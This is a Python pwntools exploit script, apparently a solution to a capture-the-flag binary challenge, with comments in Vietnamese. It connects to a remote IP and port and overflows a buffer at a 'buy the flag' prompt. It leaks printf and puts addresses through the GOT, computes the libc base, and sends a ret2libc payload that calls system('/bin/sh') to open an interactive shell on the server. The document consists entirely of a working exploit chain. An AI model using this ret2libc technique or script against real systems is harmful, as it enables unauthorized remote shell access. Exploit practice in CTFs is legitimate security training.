from pwn import *

a = remote(host = '35.247.171.91', port = 11339)
# a = process('./pwn03')
# raw_input('debug')
# buoc 1: xac dinh version libc va tim offset cac ham
main_add = 0x8048691
print_plt = 0x80484c0
print_got = 0x804a014
puts_got = 0x804a020
# tim dia chi ham printf trong libc
a.sendline('1')
a.recvuntil('Enter the Username:\n')
a.sendline('a')
a.recvuntil('Enter the Password:\n')
a.sendline('pass')
a.recvuntil('Your choice: ')
a.sendline('2')
a.recvuntil('Enter the Username:\n')
a.sendline('a')
a.recvuntil('Enter the Password:\n')
a.sendline('pass')
a.recvuntil('Your choice: ')
a.sendline('3')
a.recvuntil('Enter the number:')
a.sendline('15000000')
a.recvuntil('Your choice: ')
a.sendline('5')
a.recvuntil('You can buy the flag (y/n)?')
buff = p32(print_plt)
buff += p32(main_add)
buff += p32(print_got)
buff2 = 'y' + 'a'*5 + buff
a.sendline(buff2)
a.recvuntil("Nah, you can't. I wan't to give for you. Haha\n")
ad = a.recv(4) 
address_printf = u32(ad)
print "printf_libc: 0x%x" % address_printf #xac dinh duoc dia chi cua printf trong libc
# tim dia chi ham puts trong libc
a.sendline('1')
a.recvuntil('Enter the Username:\n')
a.sendline('a')
a.recvuntil('Enter the Password:\n')
a.sendline('pass')
a.recvuntil('Your choice: ')
a.sendline('2')
a.recvuntil('Enter the Username:\n')
a.sendline('a')
a.recvuntil('Enter the Password:\n')
a.sendline('pass')
a.recvuntil('Your choice: ')
a.sendline('3')
a.recvuntil('Enter the number:')
a.sendline('15000000')
a.recvuntil('Your choice: ')
a.sendline('5')
a.recvuntil('You can buy the flag (y/n)?')
buff = p32(print_plt)
buff += p32(main_add)
buff += p32(puts_got)
buff2 = 'y' + 'a'*5 + buff
a.sendline(buff2)
a.recvuntil("Nah, you can't. I wan't to give for you. Haha\n")
ad = a.recv(4) 
address_puts = u32(ad)
print "puts_libc: 0x%x" % address_puts #xac dinh duoc dia chi cua puts trong libc

# search google libc database de tim dia chi 2 ham nay nam trong thu vien nao
# => co thu vien, tim duoc offset giua cac ham
printf_offset = 0x050b60
system_offset = 0x03cd10
binsh_offset = 0x17b8cf
#tinh dia chi nen cua libc
libc_base = address_printf - printf_offset
system_add = system_offset + libc_base
binsh_add = binsh_offset + libc_base
print "0x%x" % libc_base
print "0x%x" % system_add
print "0x%x" % binsh_add
#buoc 2: leo shell len server

a.sendline('1')
a.recvuntil('Enter the Username:\n')
a.sendline('a')
a.recvuntil('Enter the Password:\n')
a.sendline('pass')
a.recvuntil('Your choice: ')
a.sendline('2')
a.recvuntil('Enter the Username:\n')
a.sendline('a')
a.recvuntil('Enter the Password:\n')
a.sendline('pass')
a.recvuntil('Your choice: ')
a.sendline('3')
a.recvuntil('Enter the number:')
a.sendline('15000000')
a.recvuntil('Your choice: ')
a.sendline('5')
a.recvuntil('You can buy the flag (y/n)?')
buff3 = 'y'*6
buff3 += p32(system_add)
buff3 += p32(main_add)
buff3 += p32(binsh_add)
a.sendline(buff3)

a.interactive()